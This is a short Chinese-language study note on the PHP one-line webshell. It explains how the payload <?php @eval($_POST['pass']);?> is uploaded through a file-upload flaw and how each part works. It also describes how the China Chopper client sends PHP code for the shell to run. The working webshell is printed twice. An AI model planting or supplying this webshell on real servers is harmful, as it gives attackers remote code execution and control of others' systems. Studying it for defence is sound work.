一句话木马 webshell 到web服务器目录 接着权获取系统权限

基本原理利用文件上传漏洞上传webshell

 <?php @eval($_POST['pass']);?> 

--- <?php ?> --- php文件要求格式

--- @ 表示后面即使执行错误，也不报错

--- eval() 函数表示把括号内的全当代码执行

--- $_POST['pass`']`表示从页面中获得pass这个参数值。

​	php 超全局变量：`$_GET`、`$_POST`就是其中之一

​    `		$_POST['pass']`; 的意思就是pass这个变量，用post的方法接收。

​					就是来收集 请求方法为post 的名字为pass表单里面的值

​			 ---  $_POST数组获取使用POST方式提交的表单数据

​                form标签的指定该属性："method="post"。

​					就是获取表单名为pass中的表单内容

  	 比如 eval( "echo 'a' ") == echo 'a' 

​		 <?php @eval($_POST['pass']);?>   

​			首先用post请求接受变量pass  若pass = echo 'a'  

​			代码就变成了 <?php eval("echo 'a';"); ?>

所以我们可以简单的想 中国菜刀发的这么一个包 包的代码是打开指定目录的句柄，然后进行循环扫描，并附带上权限、时间、大小、日期 这个包我这里用package来代替 所以在操作的时候其实就是 key = package 然后通过eval函数执行package的php代码 从而最终达成目的
中国菜刀 发一个包，包的代码是打开目录的
